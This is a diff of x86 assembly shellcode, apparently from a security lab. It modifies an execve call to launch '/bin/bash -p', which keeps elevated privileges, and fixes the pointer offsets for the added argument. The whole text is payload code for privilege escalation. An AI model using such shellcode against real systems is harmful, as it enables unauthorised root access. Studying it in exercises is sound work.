@@ -1,7 +1,7 @@
 global _start
 
 section .text
-; execve("/bin/bash", ["/bin/bash", 0x0], [0x0]);
+; execve("/bin/bash", ["/bin/bash", "-p", 0x0], [0x0]);
 _start:
     xor eax, eax       ; set eax to 0x0
 
@@ -20,9 +20,9 @@ _start:
     push eax           ;push null pointer
     push ecx           ;push address of "-p"
     push ebx           ;push address of "/bin/bash"
-    mov ecx, esp       ;ecx points to ["bin/bash", 0x0]
+    mov ecx, esp       ;ecx points to ["bin/bash", "-p", 0x0]
 
-    lea edx, [ecx+0x4] ;edx points to a null pointer
+    lea edx, [ecx+0x8] ;edx points to a null pointer
 
     ; execve() is sycall 11
     add al, 0x5
